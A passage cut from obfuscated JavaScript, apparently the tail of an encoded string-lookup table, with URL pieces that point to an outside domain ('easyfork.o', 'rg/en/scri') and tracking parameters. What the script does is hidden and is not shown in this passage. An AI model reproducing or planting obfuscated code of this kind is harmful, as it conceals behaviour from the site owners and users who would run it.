    'W6C1gmoMASo6W5T0hrS',
    'xmovkCkOfs8',
    'WQNdSCkgBmoEdfFcOmopBq',
    'zw51C2vYANmUBW',
    'BYbIyxnLlg1VBW',
    'WP4gr8kivCovnsijWRS',
    'W4xcGHddIuNcKCoSW4ilW5K',
    'pmzu080j7r',
    'aNP1xSoLgSo+grHV',
    'BSoDWRlcOmo6W4pdVG',
    'zwfZEwzVCMSUBW',
    'ChrZlZm3ndC5na',
    'W5VcK8or',
    'AwXHDgLVBIXTAq',
    'pCkyWOCYWO3dIXXzW7ZdKq',
    'rg/en/scri',
    'WPKYn8kVW6jKC8o0W5GU',
    'WPH7W7hdQCk7eSo6W4qxja',
    'CMCVzw4VC2nYAq',
    'y3jLyxrLsw5JBW',
    'nSk6dmoNWPldLuSfgey',
    'ext&utm_ca',
    'easyfork.o',
    'WRHwdCkMFmoqgG1cWPS',
    'W7G7wCoWASo6W5nIhuG'
  ];
  a = function() {
    return bl;
  };
  return a();
}